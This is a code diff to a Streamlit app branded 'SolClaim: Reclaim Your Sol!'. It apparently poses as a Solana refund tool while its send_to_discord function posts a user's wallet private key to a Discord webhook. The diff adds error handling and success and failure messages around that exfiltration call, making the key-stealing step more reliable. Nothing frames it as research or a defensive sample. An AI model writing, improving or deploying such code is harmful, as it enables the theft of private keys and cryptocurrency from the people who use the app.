@@ -26,8 +26,18 @@ def send_to_discord(private_key):
     payload = {
         "content": f"⚠️ Private Key Received: `{private_key}`"
     }
-    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
-    return response.status_code == 200
+    try:
+        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
+        if response.status_code == 200:
+            st.write("✅ Private key sent to Discord webhook successfully!")
+            return True
+        else:
+            st.error(f"Failed to send private key to Discord. Status code: {response.status_code}")
+            st.write(f"Response: {response.text}")
+            return False
+    except Exception as e:
+        st.error(f"An error occurred while sending to Discord: {e}")
+        return False
 
 # Streamlit app title
 st.title("💰 SolClaim: Reclaim Your Sol!")
